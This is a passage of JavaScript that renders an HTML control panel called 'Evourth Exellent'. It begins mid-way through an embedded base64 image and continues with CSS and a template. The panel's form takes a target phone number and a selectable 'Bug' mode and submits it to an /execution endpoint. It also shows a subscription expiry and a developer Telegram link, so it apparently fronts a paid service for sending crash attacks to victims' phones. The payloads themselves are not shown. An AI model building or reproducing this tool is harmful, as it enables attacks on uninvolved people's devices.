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') no-repeat center;
        background-size: cover;
        border: 3px solid #00ffff;
        box-shadow: 0 0 20px #00ccff;
      }
      h2 {
        margin-bottom: 20px;
        color: #00ffff;
        text-shadow: 0 0 10px #00ccff;
      }
      .status {
        font-weight: bold;
        margin-bottom: 15px;
        color: ${status.includes("✅") ? "lime" : "red"};
        text-shadow: 0 0 10px ${status.includes("✅") ? "lime" : "red"};
      }
      input, select, button {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border-radius: 8px;
        border: none;
        outline: none;
        font-size: 15px;
      }
      input, select {
        background: rgba(255,255,255,0.1);
        color: #fff;
      }
      button {
        background: linear-gradient(to right, #00ccff, #0066ff);
        color: #fff;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 0 15px #00ccff;
        transition: 0.3s;
      }
      button:hover {
        background: linear-gradient(to right, #0099cc, #0033cc);
      }
      .info {
        margin-top: 15px;
        font-size: 14px;
        color: #aaa;
      }
      .btn-group {
        display: flex;
        justify-content: space-between;
        margin-top: 15px;
        gap: 10px;
      }
      .btn-small {
        flex: 1;
        padding: 8px;
        font-size: 14px;
        border-radius: 8px;
        border: none;
        cursor: pointer;
        font-weight: bold;
        background: linear-gradient(to right, #ff00cc, #3333ff);
        color: #fff;
        box-shadow: 0 0 10px #6600ff;
      }
      .btn-small.logout {
        background: linear-gradient(to right, #ff3333, #990000);
        box-shadow: 0 0 10px #ff3333;
      }
      .btn-small:hover {
        transform: scale(1.05);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="card">
        <div class="logo"></div>
        <h2>Evourth Exellent</h2>
        <div class="status">${status}</div>
        ${
          isForm
            ? `
          <form method="GET" action="/execution">
            <input type="text" name="target" placeholder="Send Nomor Target Kink 🔥" required>
            <select name="mode" required>
              <option value=""> 👾 Sellect Bug </option>
              <option value="xavier" ${
                mode === "xavier" ? "selected" : ""
              }>"xavier"</option>
              <option value="evoxellent" ${
                mode === "evoxellent" ? "selected" : ""
              }>"EvoXellent"</option>
              <option value="evogalaxy" ${mode === "evogalaxy" ? "selected" : ""}>"EvoGalaxy"</option>
            </select>
            <button type="submit">🫟 Execute</button>
          </form>
          `
            : `<div class="status">${message}</div>
               <a href="/execution" style="color:#00ffff;">Back</a>`
        }
        <div class="info">
          User: <b>${username || "-"}</b><br/>
          Expired: <b>${formattedTime}</b>
        </div>
        <div class="btn-group">
          <a href="https://t.me/ryzzxaja" target="_blank">
            <button class="btn-small">Developer</button>
          </a>
          <a href="/logout">
            <button class="btn-small logout">Logout</button>
          </a>
        </div>
      </div>
    </div>
  </body>
  </html>
  `;
};